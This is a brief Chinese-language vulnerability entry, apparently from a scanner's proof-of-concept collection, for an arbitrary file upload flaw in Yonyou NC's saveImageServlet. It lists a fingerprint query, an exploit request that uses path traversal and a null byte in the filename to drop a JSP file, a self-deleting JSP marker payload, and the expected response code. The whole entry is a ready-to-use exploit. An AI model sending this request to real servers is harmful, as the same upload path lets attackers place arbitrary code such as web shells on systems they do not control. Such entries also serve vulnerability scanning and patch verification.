# 用友NCsaveImageServlet任意文件上传漏洞

用友 ｜ 文件上传 ｜ —
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`POST /portal/pt/servlet/saveImageServlet/doPost?pageId=login&filename=../dudesuite.jsp%00 HTTP/1.1`

**Payload**
```
<% out.println("dudesuite");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
```
- **响应特征**：200